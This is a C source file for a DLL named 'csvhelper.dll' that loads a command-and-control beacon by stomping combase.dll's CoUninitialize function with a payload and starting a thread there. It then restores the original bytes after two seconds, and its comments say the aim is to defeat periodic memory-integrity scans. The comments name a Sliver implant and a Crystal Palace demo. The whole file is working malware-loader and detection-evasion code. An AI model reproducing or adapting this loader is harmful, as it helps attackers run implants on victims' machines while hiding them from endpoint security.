/*
 * plugin.c — csvhelper.dll: combase.dll slot loader with JIT restore
 *
 * All work happens in DllMain, which runs synchronously during the
 * launcher's LoadLibraryA call. Plaintext PICO is retrieved from the
 * launcher EXE via its GetPayload export, copied into combase's
 * CoUninitialize slot (RW → memcpy → RX), and the beacon thread handle
 * is handed back to the launcher through SetThreadHandle.
 *
 * Before the overwrite, we snapshot the slot's original bytes and hand
 * them to a background restorer thread; ~2s after handoff the slot is
 * memcpy'd back to its on-disk contents so a periodic memory-integrity
 * scan (S1 t+45s window) sees a pristine module.
 *
 * combase.dll must already be resident — the launcher pre-loads it so
 * we resolve with GetModuleHandleW alone, avoiding a LoadLibrary call
 * under the loader lock.
 *
 * IAT: kernel32 only — GetModuleHandleW, GetProcAddress, VirtualProtect,
 * CreateThread, CloseHandle, GetProcessHeap, HeapAlloc, HeapFree, Sleep.
 * No LoadLibrary, no bcrypt, no advapi32, no filesystem.
 */

#include <windows.h>

typedef void  (WINAPI *pfnGetPayload)(void **, SIZE_T *);
typedef void  (WINAPI *pfnSetThreadHandle)(HANDLE);

typedef struct {
    void  *slot;
    SIZE_T len;
    BYTE   original[];
} restore_ctx_t;

/*
 * ponytail: demo-PICO only. Restores combase's original bytes ~2s after
 * launch so periodic memory-integrity scans see a pristine module. Safe
 * only because the Crystal Palace demo PICO returns immediately after
 * the initial handoff — a real Sliver implant keeps executing from the
 * slot and this would page-fault it. Upgrade path: relocate the beacon
 * off the slot (own RWX alloc) before restoration, or drop this thread.
 */
static DWORD WINAPI restore_slot(LPVOID p)
{
    restore_ctx_t *c = (restore_ctx_t *)p;
    Sleep(2000);
    DWORD old;
    if (VirtualProtect(c->slot, c->len, PAGE_READWRITE, &old)) {
        memcpy(c->slot, c->original, c->len);
        VirtualProtect(c->slot, c->len, PAGE_EXECUTE_READ, &old);
    }
    HeapFree(GetProcessHeap(), 0, c);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    (void)reserved;

    if (reason != DLL_PROCESS_ATTACH)
        return TRUE;

    DisableThreadLibraryCalls(hinst);

    HMODULE exe = GetModuleHandleW(NULL);
    if (!exe) return FALSE;

    pfnGetPayload gp = (pfnGetPayload)GetProcAddress(exe, "GetPayload");
    if (!gp) return FALSE;

    void *pt = NULL;
    SIZE_T len = 0;
    gp(&pt, &len);
    if (!pt || !len) return FALSE;

    HMODULE combase = GetModuleHandleW(L"combase.dll");
    if (!combase) return FALSE;

    void *slot = (void *)GetProcAddress(combase, "CoUninitialize");
    if (!slot) return FALSE;

    /* Snapshot original slot bytes for later restoration; single heap
     * alloc holds the context struct + original bytes (flex array). */
    HANDLE heap = GetProcessHeap();
    restore_ctx_t *ctx = HeapAlloc(heap, 0, sizeof(*ctx) + len);
    if (!ctx) return FALSE;
    ctx->slot = slot;
    ctx->len  = len;
    memcpy(ctx->original, slot, len);

    DWORD old;
    if (!VirtualProtect(slot, len, PAGE_READWRITE, &old))    { HeapFree(heap, 0, ctx); return FALSE; }
    memcpy(slot, pt, len);
    if (!VirtualProtect(slot, len, PAGE_EXECUTE_READ, &old)) { HeapFree(heap, 0, ctx); return FALSE; }

    HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)slot, NULL, 0, NULL);
    if (!t) { HeapFree(heap, 0, ctx); return FALSE; }

    pfnSetThreadHandle sh = (pfnSetThreadHandle)GetProcAddress(exe, "SetThreadHandle");
    if (sh) sh(t);

    HANDLE rt = CreateThread(NULL, 0, restore_slot, ctx, 0, NULL);
    if (rt) CloseHandle(rt);
    else    HeapFree(heap, 0, ctx);

    return TRUE;
}
